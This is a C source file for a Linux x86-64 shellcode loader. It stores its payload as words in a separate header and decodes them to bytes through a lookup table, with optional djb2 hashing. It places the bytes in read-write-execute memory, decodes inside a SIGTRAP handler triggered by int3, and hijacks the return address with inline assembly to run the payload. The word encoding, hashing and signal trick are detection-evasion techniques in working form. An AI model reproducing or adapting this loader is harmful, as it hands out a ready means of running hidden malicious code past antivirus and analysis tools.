#include "lexicon.h"

#include <assert.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "shellcode.h"

// Ensure that the lookup table size is at least 256 elements
// 256 elements are required to map all bytes from 0x00 to 0xFF
static_assert(
    sizeof(LOOKUP_TABLE) / sizeof(LOOKUP_TABLE[0]) >= 256,
    "Lookup table size must be larger than 256"
);

// Calculate the number of bytes in the shellcode
static const long CODE_SIZE = sizeof(SHELLCODE) / sizeof(SHELLCODE[0]);

// Global variables
sigjmp_buf g_jump_buffer;
uint8_t* g_executable_memory;

#ifdef DJB2
static inline __attribute__((always_inline)) unsigned long djb2(const char* str) {
    unsigned long hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = (((hash << 5) + hash) + c) & 0xFFFFFFFF;
    }
    return hash;
}
#endif

// Function to find the hex value for a word
static inline __attribute__((always_inline)) uint8_t find_hex_value(const char* word) {
    for (int i = 0; i < sizeof(LOOKUP_TABLE) / sizeof(LOOKUP_TABLE[0]); i++) {
#ifdef DJB2
        if (djb2(word) == LOOKUP_TABLE[i]) {
#else
        if (strcmp(word, LOOKUP_TABLE[i]) == 0) {
#endif
            return i;
        }
    }
    // Return 0x90 (NOP) if the word is not found
    // This also allows the use of undefined words for representing NOP
#ifdef DEBUG
    printf("Word not found: %s\n", word);
#endif
    return 0x90;
}

void decode_shellcode_bytes(int signum) {
    size_t offset = 0;
    for (int i = 0; i < CODE_SIZE; i++) {
        uint8_t hex_value = find_hex_value(SHELLCODE[i]);
#ifdef DEBUG
        printf("%s -> 0x%02x\n", SHELLCODE[i], hex_value);
#endif
        g_executable_memory[offset++] = hex_value;
    }
    siglongjmp(g_jump_buffer, 1);
}

int main(int argc, char* argv[]) {
    // Calculate the size of the shellcode
    long code_size = sizeof(SHELLCODE) / sizeof(SHELLCODE[0]);

    // Allocate executable memory
    g_executable_memory = mmap(
        NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
    );
    if (g_executable_memory == MAP_FAILED) {
        perror("Failed to allocate memory");
        return EXIT_FAILURE;
    }

    // Overwrite the return address on the stack
    __asm__("movq %0, +8(%%rsp)" : : "r"(g_executable_memory));

#if defined(DEBUG) || defined(NOSIGNAL)
    if (sigsetjmp(g_jump_buffer, 1) == 0) {
        decode_shellcode_bytes(0);
    }
#else
    // Register signal handler to catch SIGTRAP
    // The int3 below will trigger the signal and decode the shellcode bytes
    signal(SIGTRAP, decode_shellcode_bytes);
    if (sigsetjmp(g_jump_buffer, 1) == 0) {
        __asm__("int3");
    }
#endif

    // Cast executable memory to a function pointer and execute
    // void (*shellcode)() = (void (*)())g_executable_memory;
    // shellcode();

    // Overwrite the return address with the address of the shellcode
    // ret will jump to the shellcode
    __asm__(
        "xorq %rax, %rax\n"
        "add $8, %rsp\n"
        "retq\n"
    );

    // Clean up the executable memory, will never be reached
    // munmap(g_executable_memory, code_size);
    // return EXIT_SUCCESS;
}
